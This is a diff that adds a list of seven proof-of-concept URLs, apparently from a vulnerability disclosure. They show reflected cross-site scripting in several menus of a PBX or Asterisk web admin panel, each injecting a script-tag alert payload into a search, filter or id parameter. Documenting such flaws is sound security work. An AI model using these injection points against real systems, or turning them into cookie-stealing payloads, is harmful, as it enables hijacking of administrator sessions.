@@ -1,0 +1,13 @@
+https://www.example.com/index.php?menu=packages&amp;nombre_paquete=%22%2F%3E%3Cscript%3Ealert(1)%3B%3C%2Fscript%3E&amp;submitInstalado=installed&amp;submit_nombre=Search
+
+https://www.example.com/?menu=pbxconfig&amp;display=recordings&amp;Submit=Go&amp;display=recordings&amp;usersnum=%22%3E%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E
+
+https://www.example.com/index.php?menu=cdrreport&amp;date_end=28%20Oct%202010&amp;date_start=28%20Oct%202010&amp;field_name=dst&amp;field_pattern=%22%2F%3E%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E&amp;filter=Filter&amp;status=ALL
+
+https://www.example.com/index.php?menu=asterisk_log&amp;filter=2010-10-28&amp;offset=0&amp;busqueda=&amp;ultima_busqueda=&amp;ultimo_offset=&amp;&amp;busqueda=%22%2F%3E%3Cscript%3Ealert(1)%3B%3C%2Fscript%3E&amp;filter=2010-10-28&amp;offset=0&amp;show=Show&amp;ultima_busqueda=&amp;ultimo_offset=
+
+https://www.example.com/index.php?menu=summary_by_extension&amp;option_fil=&amp;value_fil=&amp;date_from=28&amp;date_from=28%20Oct%202010&amp;date_to=28%20Oct%202010&amp;option_fil=Ext&amp;show=Show&amp;value_fil=%22%2F%3E%3Cscript%3Ealert(1)%3B%3C%2Fscript%3E
+
+https://www.example.com/index.php?menu=grouplist&amp;action=view&amp;id=1%22/%3E%3Cscript%3Ealert%281%29;%3C/script%3E
+
+https://www.example.com/index.php?menu=group_permission&amp;filter_group=1&amp;filter_resource=%22/%3E%3Cscript%3Ealert%281%29;%3C/script%3E 
